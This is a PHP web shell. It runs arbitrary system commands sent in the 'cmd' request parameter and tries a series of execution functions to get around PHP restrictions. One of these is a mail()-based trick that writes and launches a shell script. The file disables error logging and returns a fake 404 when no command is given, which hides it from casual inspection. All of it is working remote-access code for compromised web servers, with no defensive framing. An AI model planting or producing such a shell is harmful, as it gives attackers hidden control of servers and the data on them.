<?php
/* usage: command.php?cmd=uname%20-a */
@error_reporting(0);
@ini_set('display_errors','Off');
@ini_set('ignore_repeated_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time',0);
@ini_set('memory_limit', '256M');
@set_time_limit(0);
$chunk_size = 4096;
$cfg = array('username' => 'Z190T', 'hostname' => 'shell', 'path' => '/');
function cfgs(){
	if(stripos(PHP_OS, "WIN") === 0){
		if(AvFunc(array('getenv'))){
			$username = @getenv('USERNAME');
			if ($username !== false) {
				$GLOBALS['cfg']['username'] = $username;
			}
		}
	} else {
		if(AvFunc(array('posix_getpwuid','posix_geteuid'))){
			$pwuid = @posix_getpwuid(@posix_geteuid());
			if($pwuid !== false){
				$GLOBALS['cfg']['username'] = $pwuid['name'];
			}
		}
	}
	if(AvFunc(array('gethostname'))){
		$hostname = @gethostname();
		if($hostname !== false){
			$GLOBALS['cfg']['hostname'] = $hostname;
		}
	}
	$GLOBALS['cfg']['path'] = AvFunc(array('getcwd')) ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
	if(!isset($_SESSION)){
		session_start();
		$_SESSION['path'] = $GLOBALS['cfg']['path'];
	}
}
function AvFunc($list = array()){
	foreach($list as $entry){
		if(!function_exists($entry)){
			return false;
		}
	}
	return true;
}
function expandPath($path){
    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){
        procopen("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}
function fakemail($func, $cmd){
	$cmds = "{$cmd} > geiss.txt";
	cf('geiss.sh', base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("#!/bin/sh\n{$cmds}","\r\t\0"))));
	@chmod('geiss.sh', 0777);
	if($func == 'mail'){
		$send = @mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
	} else {
		$send = @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
	}
	if($send){sleep(5);}
	return @file_get_contents("geiss.txt");
}
function cf($f,$t){
	if(AvFunc(array('fopen','fwrite','fputs','fclose'))){
		$w=@fopen($f,"w");
		if($w){
			@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t));
			@fclose($w);
		}		
	} else {
		if(AvFunc(array('file_put_contents'))){
			@file_put_contents($f,@base64_decode($t));
		}
	}
}
function procopen($cmd){
	$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
	try {
		$process = @proc_open($cmd, $descriptorspec, $pipes);
		if(is_resource($process)){
			$stdout = ""; $buffer = "";
			do {
				$buffer = fread($pipes[1], $GLOBALS['chunk_size']);
				$stdout = $stdout . $buffer;
			} while ((!feof($pipes[1])) && (strlen($buffer) != 0));
			$stderr = ""; $buffer = "";
			do {
				$buffer = fread($pipes[2], $GLOBALS['chunk_size']);
				$stderr = $stderr . $buffer;
			} while ((!feof($pipes[2])) && (strlen($buffer) != 0));
			fclose($pipes[1]);
			fclose($pipes[2]);
			$outr = !empty($stdout) ? $stdout : $stderr;
		} else {
			$outr = 'Gagal eksekusi pak!, proc_open failed!';
			exit(1);
		}
		@proc_close($process);
		echo $outr;
	} catch(Exception $err){
		echo 'error: '.$outr->getMessage();
	}
}
function command($cmd, $cwd){
    $stdout = '';
	if(!preg_match('/2>/', $cmd)){$cmd.=' 2>&1';}
	if(AvFunc(array('chdir'))){
		if(preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)){
			@chdir(expandPath("~"));
		} else if(preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)){
			@chdir($cwd);
			preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
			@chdir(expandPath($match[1]));
		} else {
			@chdir($cwd);
			$stdout = ex($cmd);
		}
	}
	$GLOBALS['cfg']['path'] = AvFunc(array('getcwd')) ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode($GLOBALS['cfg']['path'])
    );
}
function ex($init){
	$out = '';
	$arrCmd = array('proc_open', 'popen', 'exec', 'passthru', 'system', 'shell_exec', 'mail', 'mb_send_mail');
	$tmpout = `$init`;
	if(strlen($tmpout)>0){
		$out = $tmpout;
	} else {
		foreach($arrCmd as $c){
			if(AvFunc(array($c))){
				if($c == 'proc_open'){
					ob_start(); procopen($init); $out=ob_get_clean();
				} else if($c == 'exec'){
					@$c($init,$out); $out=@join("\n",$out);
				} else if($c == 'system' || $c == 'passthru'){
					ob_start(); @$c($init); $out=ob_get_clean();
				} else if($c == 'shell_exec'){
					$out=$c($init);
				} else if($c == 'mail' || $c == 'mb_send_mail'){
					ob_start(); fakemail("{$c}",$init); $out=ob_get_clean();
				} else {
					if(@is_resource($f = @$c($init, "r"))){$out=''; while(!@feof($f)){$out .= fread($f, $GLOBALS['chunk_size']);}fclose($f);}
				}
			} else {
				$out = "gak bisa jalanin perintah pak!";
			}
			if(strlen($out)>0){ break; } else { continue; }
		}
	}
	return $out;
}
if(isset($_REQUEST['cmd']) && strlen($_REQUEST['cmd'])>0){
	cfgs();
	$outs = array();
	$cmd = $_REQUEST['cmd'];
	$command = command($cmd, $_SESSION['path']);
	$GLOBALS['cfg']['path'] = base64_decode($command['cwd']);
	$outs['userhost'] = $GLOBALS['cfg']['username']."@".$GLOBALS['cfg']['hostname'];
	$_SESSION['path'] = base64_decode($command['cwd']);
	header("Content-Type: text/plain");
	echo @iconv('UTF-8', 'ISO-8859-1//IGNORE', $outs['userhost'].':'.$_SESSION['path'].'#'.$cmd . PHP_EOL . addcslashes(base64_decode($command['stdout'])."","\t\0"));
	die();
} else {
	header("HTTP/1.0 404 Not Found");
	die();	
}
?>